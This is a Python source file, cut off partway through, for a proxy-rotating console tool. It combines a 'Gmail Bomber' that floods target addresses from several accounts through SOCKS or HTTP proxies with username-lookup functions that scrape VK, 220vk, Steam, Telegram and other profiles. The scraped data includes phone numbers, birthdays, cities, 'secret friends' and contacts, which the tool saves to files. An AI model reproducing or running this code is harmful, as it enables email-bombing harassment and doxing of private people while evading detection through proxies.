import folium.map
import requests
import bs4
from bs4 import BeautifulSoup
import lxml
import colorama
import pyfiglet
from colorama import init
from colorama import Fore, Back, Style
import threading

import time
import fake_useragent
import vk_api
import json 
import datetime
import csv
from telethon.sync import TelegramClient
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.types import ChannelParticipantsSearch
from telethon.tl.types import PeerChannel
import folium
import phonenumbers
from phonenumbers import timezone, geocoder, carrier

from os import system, name
from smtplib import SMTP_SSL as smtpserver
from time import sleep
from getpass import getpass
from sys import exit
from email.mime.text import MIMEText
import smtplib
import re
import random
import os
import asyncio
from telethon import TelegramClient
from telethon.errors import FloodWaitError, SessionPasswordNeededError, PhoneCodeInvalidError
import configparser
from urllib.parse import urlparse
import socket
import socks




init()




def clear_console():
    if os.name == 'nt':
        if 'TERM' in os.environ or 'SHELL' in os.environ:
            os.system('clear')
        else:
            os.system('cls')  
    else:
        os.system('clear')
    

# USER-AGENT

user = fake_useragent.UserAgent().random
headers = {'user-agent': user}

# Функция для цветных заголовков
def print_service_header(service_name):
    print(f"\n{Fore.WHITE}{'=' * 50}")
    print(f"{Fore.WHITE}{pyfiglet.figlet_format(service_name, font='small')}")
    print(f"{Fore.WHITE}{'=' * 50}{Style.RESET_ALL}")

#PROXY

################################################################################################

PROXIES_LIST = []


def load_proxies(file_path: str) -> dict:
    """Загружает прокси из конфигурационного файла"""
    global PROXIES_LIST
    
    # Proxy test
    if not os.path.exists(file_path):
        print(f"{Fore.RED}Proxy config file not found: {file_path}")
        return False
        
    try:
        config = configparser.ConfigParser()
        config.read(file_path)
        
        for section in config.sections():
            if section.startswith("Proxy"):
                proxy_str = config[section].get("url", "")
                if proxy_str:
                    PROXIES_LIST.append(proxy_str)
        
        print(f"{Fore.GREEN}Loaded {len(PROXIES_LIST)} proxies from config")
        return True
        
    except Exception as e:
        print(f"{Fore.RED}Error loading proxies: {e}")
        return False

def get_random_proxy() -> dict:
    if not PROXIES_LIST:
        return None
    
    proxy_str = random.choice(PROXIES_LIST)
    
    # Handle SOCKS proxies
    if proxy_str.startswith('socks5://') or proxy_str.startswith('socks4://'):
        return {
            'http': proxy_str,
            'https': proxy_str
        }
    
    # Handle HTTP/HTTPS proxies
    parsed = urlparse(proxy_str)
    return {
        'http': f"{parsed.scheme}://{parsed.netloc}",
        'https': f"{parsed.scheme}://{parsed.netloc}"
    }

def get_random_proxy_for_telethon() -> tuple:
    """Возвращает прокси в формате для Telethon"""
    if not PROXIES_LIST:
        return None
    
    proxy_str = random.choice(PROXIES_LIST)
    parsed = urlparse(proxy_str)
    
    # Telethon требует отдельные компоненты
    return (parsed.scheme, parsed.hostname, parsed.port)


def get_location(url, proxy_str):
    try:
        if not proxy_str:
            print(f"{Fore.YELLOW}No proxy, trying direct connection")
            response = requests.get(url=url, headers=headers, timeout=10)
            if response.status_code == 200:
                print(f"{Fore.GREEN}Direct connection success!{Style.RESET_ALL}")
                return None
            return None

        proxies = {'http': proxy_str, 'https': proxy_str}
        print(f"{Fore.MAGENTA}Testing proxy: {proxy_str}{Style.RESET_ALL}")
        
        # Проверка через 2ip.ru
        response = requests.get(url=url, headers=headers, proxies=proxies, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'lxml')
            ip = soup.find('div', class_='ip').text.strip()
            location = soup.find('div', class_='value-country').text.strip()
            print(f"{Fore.GREEN}Proxy works!{Style.RESET_ALL}")
            print(f"IP: {ip}")
            print(f"Location: {location}")
            return proxies
        
        print(f"{Fore.RED}Proxy connection failed (status {response.status_code}){Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Proxy error: {type(e).__name__} - {str(e)}{Style.RESET_ALL}")
    return None

















def validate_proxies_from_json(json_path, output_ini="proxycfg.ini"):
    print(f"{Fore.CYAN}\nValidating proxies from: {json_path}")
    try:
        with open(json_path, 'r', encoding='utf-8') as f:
            proxies_data = json.load(f)
        
        working_proxies = []
        
        for item in proxies_data:
            proxy_url = item.get('proxy')
            if not proxy_url:
                continue
                
            print(f"Testing proxy: {proxy_url}")
            start_time = time.time()
            try:
                response = requests.get(
                    'https://2ip.ru', 
                    proxies={'http': proxy_url, 'https': proxy_url},
                    timeout=10,
                    headers=headers
                )
                if response.status_code == 200:
                    end_time = time.time()
                    time_taken = end_time - start_time
                    print(f"  {Fore.GREEN}OK! Time: {time_taken:.2f}s{Style.RESET_ALL}")
                    
                    # Extract country code if available
                    country = item.get('geolocation', {}).get('country', 'N/A')
                    working_proxies.append({
                        'url': proxy_url,
                        'time': time_taken,
                        'country': country
                    })
                else:
                    print(f"  {Fore.RED}Failed: HTTP {response.status_code}{Style.RESET_ALL}")
            except Exception as e:
                print(f"  {Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        
        # Sort by response time
        working_proxies.sort(key=lambda x: x['time'])
        
        # Save to INI
        config = configparser.ConfigParser()
        for i, proxy in enumerate(working_proxies, 1):
            section = f"Proxy{i}"
            config[section] = {
                'name': f"{proxy['country']} ({proxy['time']:.2f}s)",
                'url': proxy['url']
            }
        
        with open(output_ini, 'w') as configfile:
            config.write(configfile)
            
        print(f"{Fore.GREEN}Saved {len(working_proxies)} working proxies to {output_ini}{Style.RESET_ALL}")
        return True
        
    except Exception as e:
        print(f"{Fore.RED}Validation error: {e}{Style.RESET_ALL}")
        return False


################################################################################################

# CONFIG

TELEGRAM_ACCOUNTS = []


def load_telegram_accounts(file_path):
    """Загружает аккаунты Telegram из конфигурационного файла"""
    global TELEGRAM_ACCOUNTS
    TELEGRAM_ACCOUNTS = []
    
    abs_path = os.path.abspath(file_path)
    
    if not os.path.exists(abs_path):
        print(f"{Fore.RED}Файл конфигурации не найден: {abs_path}{Style.RESET_ALL}")
        if input("Создать новый конфиг? (y/n): ").lower() == 'y':
            return save_accounts_config(file_path)
        return False
    
    try:
        config = configparser.ConfigParser()
        config.read(abs_path)
        
        for section in config.sections():
            if section.startswith("TelegramAccount"):
                # Проверяем обязательные поля
                if not config.has_option(section, "API_ID") or not config.has_option(section, "API_HASH"):
                    print(f"{Fore.YELLOW}Пропуск секции {section}: отсутствуют обязательные поля{Style.RESET_ALL}")
                    continue
                    
                account = {
                    "name": config.get(section, "Name", fallback="Unnamed"),
                    "api_id": config.get(section, "API_ID"),
                    "api_hash": config.get(section, "API_HASH")
                }
                TELEGRAM_ACCOUNTS.append(account)
        
        if not TELEGRAM_ACCOUNTS:
            print(f"{Fore.YELLOW}В конфиге нет валидных аккаунтов Telegram{Style.RESET_ALL}")
            return False
            
        print(f"{Fore.GREEN}Загружено {len(TELEGRAM_ACCOUNTS)} аккаунтов Telegram{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}Ошибка загрузки конфига: {str(e)}{Style.RESET_ALL}")
        return False

def get_random_account():
    """Возвращает случайный аккаунт из списка"""
    if not TELEGRAM_ACCOUNTS:
        print(f"{Fore.RED}Нет доступных аккаунтов Telegram!{Style.RESET_ALL}")
        return None
    return random.choice(TELEGRAM_ACCOUNTS)

def save_accounts_config(file_path):
    """Сохраняет пример конфигурационного файла"""
    try:
        abs_path = os.path.abspath(file_path)
        os.makedirs(os.path.dirname(abs_path), exist_ok=True)
        
        config = configparser.ConfigParser()
        
        # Пример аккаунтов
        config['TelegramAccount1'] = {
            'Name': 'Мой первый аккаунт',
            'API_ID': 'ваш_api_id_1',
            'API_HASH': 'ваш_api_hash_1'
        }
        
        config['TelegramAccount2'] = {
            'Name': 'Мой второй аккаунт',
            'API_ID': 'ваш_api_id_2',
            'API_HASH': 'ваш_api_hash_2'
        }
        
        with open(abs_path, 'w') as configfile:
            config.write(configfile)
        
        print(f"{Fore.GREEN}Пример конфига сохранен: {abs_path}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Замените 'ваш_api_id_X' и 'ваш_api_hash_X' настоящими данными{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}Ошибка создания конфига: {str(e)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Убедитесь что у вас есть права на запись в указанную директорию{Style.RESET_ALL}")
        return False





def load_bomber_config(file_path: str) -> dict:
    """Загружает конфиг бомбера из INI-файла"""
    config = configparser.ConfigParser()
    
    if not os.path.exists(file_path):
        print(f"{Fore.RED}Config file not found: {file_path}")
        return None
        
    try:
        config.read(file_path)
        
        # Основные параметры
        bomber_config = {
            'subject': config['Bomber']['Subject'],
            'message': config['Bomber']['Message'],
            'amount_per_account': int(config['Bomber'].get('AmountPerAccount', 10))
        }
        
        # Цели
        targets = []
        for key in config['Targets']:
            targets.append(config['Targets'][key])
        bomber_config['targets'] = targets
        
        # Аккаунты
        accounts = []
        for section in config.sections():
            if section.startswith("Account"):
                account = {
                    'email': config[section]['Email'],
                    'app_password': config[section]['AppPassword']
                }
                accounts.append(account)
        bomber_config['accounts'] = accounts
        
        print(f"{Fore.GREEN}Loaded Gmail Bomber config: {len(accounts)} accounts, {len(targets)} targets")
        return bomber_config
        
    except Exception as e:
        print(f"{Fore.RED}Error loading bomber config: {e}")
        return None

def bomber_worker(account: dict, target: str, subject: str, message: str, amount: int):
    try:
        # Получаем случайный прокси
        proxy_dict = get_random_proxy()
        proxy_url = proxy_dict.get('https') if proxy_dict else None
        
        # Настройка SMTP
        msg = MIMEText(message)
        msg['Subject'] = subject
        msg['From'] = account['email']
        msg['To'] = target
        
        # Создаем сокет через прокси
        sock = None
        if proxy_url:
            try:
                parsed = urlparse(proxy_url)
                proxy_type = socks.SOCKS5
                
                if "socks4" in parsed.scheme:
                    proxy_type = socks.SOCKS4
                elif "http" in parsed.scheme:
                    proxy_type = socks.HTTP
                
                sock = socks.socksocket()
                sock.set_proxy(
                    proxy_type=proxy_type,
                    addr=parsed.hostname,
                    port=parsed.port,
                    username=parsed.username,
                    password=parsed.password
                )
                sock.connect(('smtp.gmail.com', 465))
                print(f"{Fore.CYAN}Using proxy: {parsed.hostname}:{parsed.port}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Proxy error: {e}. Using direct connection{Style.RESET_ALL}")
                sock = None
        
        # Создаем SMTP соединение
        server = None
        try:
            if sock:
                server = smtplib.SMTP_SSL(None, None, sock=sock)
            else:
                server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            
            server.login(account['email'], account['app_password'])
                
            for i in range(amount):
                try:
                    server.sendmail(account['email'], target, msg.as_string())
                    print(f"{Fore.YELLOW}[{account['email']}] Sent {i+1}/{amount} to {target}")
                    time.sleep(random.uniform(1.0, 3.0))
                except smtplib.SMTPException as e:
                    print(f"{Fore.RED}SMTP error: {e}{Style.RESET_ALL}")
                    break
                except Exception as e:
                    print(f"{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}")
                    break
        finally:
            if server:
                try:
                    server.quit()
                except:
                    pass
                    
    except Exception as e:
        print(f"{Fore.RED}Error in bomber_worker: {type(e).__name__} - {str(e)}{Style.RESET_ALL}")




################################################################################################

#USERNAME

################################################################################################

# VK
def VK_search(username, vkTOKEN, VKvers, proxy_dict=None):
    print_service_header("VK")
    proxy_dict = get_random_proxy()
    fields = '''
        photo_200, status, city, country, bdate, contacts, 
        education, followers_count, occupation, personal, 
        relation, schools, universities, counters, activities,
        interests, music, movies, tv, books, about, career,
        military, home_town
    '''
    params = {
        'access_token': vkTOKEN,
        'v': VKvers,
        'user_ids': username,
        'fields': fields
    }
    
    try:
        response = requests.get(
            'https://api.vk.com/method/users.get',
            headers=headers,
            params=params,
            proxies=proxy_dict,
            timeout=15
        )
        
        if response.status_code == 200:
            data = response.json()
            
            if 'error' in data:
                error = data['error']
                print(f"{Fore.RED}VK Error [{error['error_code']}]: {error['error_msg']}")
                if error['error_code'] == 29:
                    print(f"{Fore.YELLOW}Use another proxy or wait")
                return
            
            users = data.get('response', [])
            if users:
                user = users[0]
                print(f"\n{Fore.MAGENTA}Main info:")
                print(f"ID: {user.get('id')}")
                print(f"Name: {Fore.GREEN}{user.get('first_name')} {user.get('last_name')}{Style.RESET_ALL}")
                print(f"URL: {Fore.BLUE}https://vk.com/id{user.get('id')}{Style.RESET_ALL}")
                print(f"USERNAME: {Fore.CYAN}{user.get('screen_name')}{Style.RESET_ALL}")
                print(f"Status: {user.get('status', 'No status')}")
                
                print(f"\n{Fore.MAGENTA}Detailed info:")
                if 'city' in user:
                    print(f"City: {Fore.CYAN}{user['city']['title']}{Style.RESET_ALL}")
                if 'bdate' in user:
                    print(f"Birthday: {Fore.CYAN}{user['bdate']}{Style.RESET_ALL}")
                if 'mobile_phone' in user and user['mobile_phone']:
                    print(f"Phone: {Fore.GREEN}{user['mobile_phone']}{Style.RESET_ALL}")
                if 'home_town' in user:
                    print(f"Hometown: {Fore.CYAN}{user['home_town']}{Style.RESET_ALL}")
                
                if 'counters' in user:
                    print(f"\n{Fore.MAGENTA}Statistics:")
                    counters = user['counters']
                    print(f"Friends: {Fore.CYAN}{counters.get('friends', 'Hidden')}{Style.RESET_ALL}")
                    print(f"Followers: {Fore.CYAN}{counters.get('followers', 'Hidden')}{Style.RESET_ALL}")
                    print(f"Photos: {Fore.CYAN}{counters.get('photos', 'Hidden')}{Style.RESET_ALL}")
                    print(f"Videos: {Fore.CYAN}{counters.get('videos', 'Hidden')}{Style.RESET_ALL}")
                
                print(f"\n{Fore.MAGENTA}Additional info:")
                for field in ['activities', 'interests', 'music', 'movies', 'books', 'about']:
                    if field in user and user[field]:
                        print(f"{field.capitalize()}: {Fore.YELLOW}{user[field][:100]}...{Style.RESET_ALL}")
                
                with open(f'vk_user_{user["id"]}.json', 'w', encoding='utf-8') as f:
                    json.dump(user, f, ensure_ascii=False, indent=2)
                print(f"{Fore.GREEN}\nData saved to JSON file{Style.RESET_ALL}")
                
                get_posts(user['id'], vkTOKEN, VKvers, proxy_dict)
            else:
                print(f"{Fore.RED}No user found")
        else:
            print(f"{Fore.RED}HTTP Error: {response.status_code}")
            
    except Exception as e:
        print(f"{Fore.RED}VK Search Error: {e}")

def get_posts(user_id, token, version, proxy_dict=None):
    proxy_dict = get_random_proxy()
    try:
        params = {
            'owner_id': user_id,
            'count': 5,
            'access_token': token,
            'v': version
        }
        
        response = requests.get(
            'https://api.vk.com/method/wall.get',
            params=params,
            proxies=proxy_dict,
            timeout=10
        )
        
        data = response.json()
        if 'response' in data:
            posts = data['response']['items']
            print(f"\n{Fore.MAGENTA}Recent posts:")
            for i, post in enumerate(posts, 1):
                text = post['text'][:70] + "..." if post['text'] else "[no text]"
                print(f"{i}. {Fore.YELLOW}{text}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Failed to get posts")
    
    except Exception as e:
        print(f"{Fore.RED}Posts Error: {e}")

# 220VK
    
def search_220vk(username, proxy_dict=None):
    proxy_dict = get_random_proxy()
    url = f"https://220vk.com/{username}"
    try:
        response = requests.get(url, headers=headers, proxies=proxy_dict, timeout=15)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'lxml')
            print_service_header("220VK.COM")
            print(f"{Fore.BLUE}Profile URL: {url}{Style.RESET_ALL}")
            
            # Основная информация
            name_elem = soup.find('h2', id='profile_name')
            name = name_elem.text.strip() if name_elem else "N/A"
            
            online_elem = soup.find('div', class_='profile_online')
            online = online_elem.text.strip() if online_elem else "N/A"
            
            avatar_elem = soup.find('div', class_='profile_avatar')
            avatar_url = avatar_elem.find('img')['src'] if avatar_elem and avatar_elem.find('img') else "N/A"
            
            print(f"{Fore.MAGENTA}Name: {Fore.GREEN}{name}{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}Online Status: {Fore.CYAN}{online}{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}Avatar URL: {Fore.BLUE}{avatar_url}{Style.RESET_ALL}")
            
            # Статистика профиля
            counters = {}
            counters_elems = soup.find_all('div', class_='counters_item')
            for counter in counters_elems:
                title = counter.find('div', class_='counters_title').text.strip()
                count = counter.find('div', class_='counters_count').text.strip()
                counters[title] = count
            
            if counters:
                print(f"\n{Fore.YELLOW}===== Profile Statistics =====")
                for title, count in counters.items():
                    print(f"{Fore.MAGENTA}{title}: {Fore.CYAN}{count}{Style.RESET_ALL}")
            
            # Подробная информация профиля
            info_sections = soup.find_all('div', class_='profile_info_section')
            if info_sections:
                print(f"\n{Fore.YELLOW}===== Detailed Profile Information =====")
                
                for section in info_sections:
                    section_title = section.find('div', class_='profile_info_title').text.strip()
                    print(f"\n{Fore.CYAN}── {section_title} ──{Style.RESET_ALL}")
                    
                    items = section.find_all('div', class_='profile_info_row')
                    if not items:
                        print(f"{Fore.YELLOW}No information available{Style.RESET_ALL}")
                        continue
                    
                    for item in items:
                        title = item.find('div', class_='profile_info_label').text.strip()
                        value = item.find('div', class_='profile_info_value')
                        
                        # Обработка ссылок
                        if value.find('a'):
                            links = []
                            for link in value.find_all('a'):
                                link_text = link.text.strip()
                                link_href = link.get('href', '')
                                if link_href:
                                    links.append(f"{Fore.BLUE}{link_text} ({link_href}){Style.RESET_ALL}")
                            value_text = ", ".join(links)
                        # Обработка изображений
                        elif value.find('img'):
                            images = []
                            for img in value.find_all('img'):
                                img_src = img.get('src', '')
                                if img_src:
                                    images.append(f"{Fore.BLUE}{img_src}{Style.RESET_ALL}")
                            value_text = ", ".join(images)
                        else:
                            value_text = value.text.strip()
                        
                        print(f"{Fore.MAGENTA}{title}: {Fore.CYAN}{value_text}{Style.RESET_ALL}")
            
            # Информация о друзьях
            friends_data = {}
            friends_section = soup.find('div', class_='profile_friends')
            if friends_section:
                print(f"\n{Fore.YELLOW}===== Friends Information =====")
                
                # Типы друзей
                friend_types = {
                    'profile_friends_all': "All Friends",
                    'profile_friends_secret': "Secret Friends",
                    'profile_friends_mutual': "Mutual Friends",
                    'profile_friends_common': "Common Friends"
                }
                
                for class_name, friend_type in friend_types.items():
                    friend_block = friends_section.find('div', class_=class_name)
                    if friend_block:
                        count = friend_block.find('div', class_='profile_friends_count').text.strip()
                        friends_data[friend_type] = count
                        print(f"{Fore.MAGENTA}{friend_type}: {Fore.CYAN}{count}{Style.RESET_ALL}")
            
            # Посты пользователя
            posts = soup.find_all('div', class_='wall_post')
            if posts:
                print(f"\n{Fore.YELLOW}===== Recent Posts ({len(posts)}) =====")
                
                for i, post in enumerate(posts[:5], 1):
                    # Информация о посте
                    post_info = post.find('div', class_='wall_post_info')
                    date = post_info.find('div', class_='wall_post_date').text.strip() if post_info else "N/A"
                    
                    # Текст поста
                    text_elem = post.find('div', class_='wall_post_text')
                    text = text_elem.text.strip() if text_elem else "[No text]"
                    
                    # Вложения
                    attachments = []
                    # Фото
                    photos = post.find_all('div', class_='wall_image')
                    for photo in photos:
                        img = photo.find('img')
                        if img and img.get('src'):
                            attachments.append(f"Photo: {Fore.BLUE}{img['src']}{Style.RESET_ALL}")
                    
                    # Видео
                    videos = post.find_all('div', class_='wall_video')
                    for video in videos:
                        video_title = video.find('div', class_='wall_video_title').text.strip() if video else ""
                        video_duration = video.find('div', class_='wall_video_duration').text.strip() if video else ""
                        attachments.append(f"Video: {video_title} ({video_duration})")
                    
                    # Ссылки
                    links = post.find_all('a', class_='wall_link')
                    for link in links:
                        link_title = link.find('div', class_='wall_link_title').text.strip() if link else ""
                        link_url = link.get('href', '')
                        if link_url:
                            attachments.append(f"Link: {link_title} ({Fore.BLUE}{link_url}{Style.RESET_ALL})")
                    
                    # Вывод информации о посте
                    print(f"\n{Fore.GREEN}Post #{i} ({date}){Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}{text}{Style.RESET_ALL}")
                    
                    if attachments:
                        print(f"{Fore.MAGENTA}Attachments:")
                        for attachment in attachments:
                            print(f"- {attachment}")
            
            # Контактная информация
            contact_info = soup.find('div', class_='profile_contacts')
            if contact_info:
                print(f"\n{Fore.YELLOW}===== Contact Information =====")
                
                contacts = contact_info.find_all('div', class_='profile_contact')
                for contact in contacts:
                    contact_type = contact.find('div', class_='profile_contact_name').text.strip()
                    contact_value = contact.find('div', class_='profile_contact_value').text.strip()
                    print(f"{Fore.MAGENTA}{contact_type}: {Fore.CYAN}{contact_value}{Style.RESET_ALL}")
            
            # Дополнительные данные
            additional_data = {}
            
            # Статус
            status_elem = soup.find('div', class_='profile_status')
            if status_elem:
                additional_data['Status'] = status_elem.text.strip()
            
            # Никнейм
            nickname_elem = soup.find('div', class_='profile_nickname')
            if nickname_elem:
                additional_data['Nickname'] = nickname_elem.text.strip()
            
            # Город
            city_elem = soup.find('div', class_='profile_city')
            if city_elem:
                additional_data['City'] = city_elem.text.strip()
            
            # Вывод дополнительных данных
            if additional_data:
                print(f"\n{Fore.YELLOW}===== Additional Information =====")
                for key, value in additional_data.items():
                    print(f"{Fore.MAGENTA}{key}: {Fore.CYAN}{value}{Style.RESET_ALL}")
            
            print(f"\n{Fore.GREEN}220vk.com data retrieved successfully!{Style.RESET_ALL}")
            
            # Сохранение данных в файл
            filename = f'220vk_{username}.html'
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(response.text)
            print(f"{Fore.CYAN}Full HTML saved to: {filename}{Style.RESET_ALL}")
                
        elif response.status_code == 404:
            print(f"{Fore.RED}Profile not found on 220vk.com{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}220vk.com error: HTTP {response.status_code}{Style.RESET_ALL}")
            
    except Exception as e:
        print(f"{Fore.RED}220vk.com Error: {str(e)}{Style.RESET_ALL}")

# Tiktok
def search_tiktok(username, proxy_dict=None):
    proxy_dict = get_random_proxy()
    print_service_header("TIKTOK")
    try:
        url = f"https://www.tiktok.com/@{username}"
        response = requests.get(url, headers=headers, proxies=proxy_dict)
        soup = BeautifulSoup(response.text, 'lxml')
        if response.status_code == 200:
            print(Fore.GREEN + 'User Found in Tiktok')
            print(url)
            
        else:
            print("404")
        
    except Exception as e:
        print("errortry")

# Steam
def search_steam(username, proxy_dict=None):
    proxy_dict = get_random_proxy()
    print_service_header("STEAM")
    url = f"https://steamcommunity.com/id/{username}"
    try:
        response = requests.get(url, headers=headers, proxies=proxy_dict, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'lxml')
            
            if "The specified profile could not be found" in response.text:
                print(f"{Fore.RED}Steam profile not found")
                return
                
            print(f"\n{Fore.GREEN}Steam profile found!")
            print(f"URL: {Fore.BLUE}{url}{Style.RESET_ALL}")
            
            try:
                persona_name = soup.find('span', class_='actual_persona_name')
                real_name = soup.find('div', class_='header_real_name')
                online_status = soup.find('div', class_='profile_in_game_header')
                
                if persona_name:
                    print(f"Persona Name: {Fore.GREEN}{persona_name.text.strip()}{Style.RESET_ALL}")
                if real_name:
                    print(f"Real Name: {Fore.CYAN}{real_name.text.strip()}{Style.RESET_ALL}")
                if online_status:
                    status = online_status.text.strip()
                    color = Fore.GREEN if "Online" in status else Fore.YELLOW
                    print(f"Status: {color}{status}{Style.RESET_ALL}")
                
                level_div = soup.find('div', class_='persona_level')
                if level_div:
                    level = level_div.find('span', class_='friendPlayerLevelNum')
                    print(f"Level: {Fore.CYAN}{level.text.strip() if level else 'N/A'}{Style.RESET_ALL}")
                
                summary = soup.find('div', class_='profile_summary')
                if summary:
                    print(f"\n{Fore.MAGENTA}Bio:")
                    print(f"{Fore.YELLOW}{summary.text.strip()}{Style.RESET_ALL}")
                
                game_stats = soup.find('div', class_='game_info')
                if game_stats:
                    print(f"\n{Fore.MAGENTA}Game Stats:")
                    print(f"{Fore.CYAN}{game_stats.text.strip().replace('\n\n', '\n')}{Style.RESET_ALL}")
                
                recent_games = soup.find('div', class_='recent_games')
                if recent_games:
                    print(f"\n{Fore.MAGENTA}Recent Activity:")
                    games = recent_games.find_all('div', class_='game_name')
                    if games:
                        for game in games[:3]:
                            print(f"- {Fore.CYAN}{game.text.strip()}{Style.RESET_ALL}")
            
            except AttributeError as e:
                print(f"{Fore.YELLOW}Couldn't extract some Steam data: {e}")
        
        else:
            print(f"{Fore.RED}Steam profile not found (HTTP {response.status_code})")
    except Exception as e:
        print(f"{Fore.RED}Steam Error: {e}")

# TELEGRAM
def search_telegram(username, proxy_dict=None):
    proxy_dict = get_random_proxy()
    print_service_header("TELEGRAM")
    url = f"https://t.me/{username}"
    try:
        response = requests.get(
            url, 
            headers=headers, 
            proxies=proxy_dict, 
            timeout=15
        )
        
        if response.status_code == 404:
            print(f"{Fore.RED}Telegram profile/channel not found")
            return
        if response.status_code != 200:
            print(f"{Fore.RED}Telegram error: HTTP {response.status_code}")
            return
            
        soup = BeautifulSoup(response.text, 'lxml')
        
        print(f"\n{Fore.GREEN}Telegram found: {Fore.BLUE}{url}{Style.RESET_ALL}")
        
        title = soup.find('div', class_='tgme_page_title')
        if title:
            print(f"{Fore.MAGENTA}Title: {Fore.GREEN}{title.text.strip()}{Style.RESET_ALL}")
        
        description = soup.find('div', class_='tgme_page_description')
        if description:
            print(f"{Fore.MAGENTA}Description: {Fore.YELLOW}{description.text.strip()}{Style.RESET_ALL}")
        
        members = soup.find('div', class_='tgme_page_extra')
        if members:
            print(f"{Fore.MAGENTA}Members: {Fore.CYAN}{members.text.strip()}{Style.RESET_ALL}")
        
        verified = soup.find('i', class_='verified-icon')
        if verified:
            print(f"{Fore.MAGENTA}Verified: {Fore.GREEN}Yes{Style.RESET_ALL}")
        
        image = soup.find('img', class_='tgme_page_photo_image')
        if image and image.get('src'):
            print(f"{Fore.MAGENTA}Profile image: {Fore.BLUE}{image['src']}{Style.RESET_ALL}")
            
    except Exception as e:
        print(f"{Fore.RED}Telegram Error: {str(e)}")

# YOUTUBE (using API)
def search_youtube(username, api_key, proxy_dict=None):
    proxy_dict = get_random_proxy()
    print_service_header("YOUTUBE")
    if not api_key:
        print(f"{Fore.YELLOW}YouTube API key not set. Skipping YouTube search.")
        return
        
    try:
        # Step 1: Get channel ID by username
        search_url = "https://www.googleapis.com/youtube/v3/search"
        params = {
            'part': 'snippet',
            'q': username,
            'type': 'channel',
            'key': api_key,
            'maxResults': 1
        }
        
        response = requests.get(
            search_url,
            params=params,
            proxies=proxy_dict,
            timeout=15
        )
        
        data = response.json()
        
        if response.status_code != 200:
            error = data.get('error', {})
            message = error.get('message', 'Unknown error')
            print(f"{Fore.RED}YouTube API Error: {message} (code: {response.status_code})")
            return
            
        if not data.get('items'):
            print(f"{Fore.RED}YouTube channel not found")
            return
            
        channel_id = data['items'][0]['id']['channelId']
        
        # Step 2: Get channel details by ID
        channel_url = "https://www.googleapis.com/youtube/v3/channels"
        params = {
            'part': 'snippet,statistics',
            'id': channel_id,
            'key': api_key
        }
        
        response = requests.get(
            channel_url,
            params=params,
            proxies=proxy_dict,
            timeout=15
        )
        
        data = response.json()
        
        if response.status_code != 200:
            error = data.get('error', {})
            message = error.get('message', 'Unknown error')
            print(f"{Fore.RED}YouTube API Error: {message} (code: {response.status_code})")
            return
            
        if not data.get('items'):
            print(f"{Fore.RED}YouTube channel details not found")
            return
            
        channel = data['items'][0]
        snippet = channel['snippet']
        stats = channel['statistics']
        
        print(f"\n{Fore.GREEN}YouTube channel found!")
        print(f"URL: {Fore.BLUE}https://www.youtube.com/@{username}{Style.RESET_ALL}")
        print(f"Channel ID: {Fore.CYAN}{channel['id']}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}Title: {Fore.GREEN}{snippet['title']}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}Published: {Fore.CYAN}{snippet['publishedAt']}{Style.RESET_ALL}")
        
        print(f"\n{Fore.MAGENTA}Statistics:")
        print(f"Subscribers: {Fore.CYAN}{stats.get('subscriberCount', 'N/A')}{Style.RESET_ALL}")
        print(f"Views: {Fore.CYAN}{stats.get('viewCount', 'N/A')}{Style.RESET_ALL}")
        print(f"Videos: {Fore.CYAN}{stats.get('videoCount', 'N/A')}{Style.RESET_ALL}")
        
        print(f"\n{Fore.MAGENTA}Description:")
        print(f"{Fore.YELLOW}{snippet['description'][:200] + '...' if len(snippet['description']) > 200 else snippet['description']}{Style.RESET_ALL}")
        
        print(f"\n{Fore.MAGENTA}Thumbnail: {Fore.BLUE}{snippet['thumbnails']['high']['url']}{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}YouTube API Error: {str(e)}")

# TWITCH
def search_twitch(username, proxy_dict=None):
    proxy_dict = get_random_proxy()
    print_service_header("TWITCH")
    url = f"https://twitchtracker.com/{username}"
    turl = f"https://www.twitch.tv/{username}"
    
    try:
        response = requests.get(url, headers=headers, proxies=proxy_dict, timeout=10)
        
        if response.status_code == 404:
            print(f"{Fore.RED}User not found on TwitchTracker")
            return
            
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'lxml')
        print(f"{Fore.GREEN}User Found on TwitchTracker!")
        print(f"Profile: {Fore.BLUE}{turl}{Style.RESET_ALL}")

        # 1. Имя пользователя
        name_tag = soup.find('h1', class_='username')
        if name_tag:
            print(f"Name: {Fore.GREEN}{name_tag.get_text(strip=True)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Name not found")

        # 2. Подписчики
        followers_div = soup.find('div', class_='g-x-s-value')
        if followers_div:
            print(f"Followers: {Fore.CYAN}{followers_div.get_text(strip=True)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Followers count not found")

        # 3. Дата регистрации
        reg_div = soup.find('div', class_='profile-created')
        if reg_div:
            reg_date = reg_div.find('span', class_='to-value')
            if reg_date:
                print(f"Registered: {Fore.CYAN}{reg_date.get_text(strip=True)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}Registration date not found")
        else:
            print(f"{Fore.YELLOW}Registration block not found")
            
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Request error: {e}")

# GITHUB
def search_github(username, proxy_dict=None):
    proxy_dict = get_random_proxy()
    print_service_header("GITHUB")
    url = f"https://github.com/{username}"
    try:
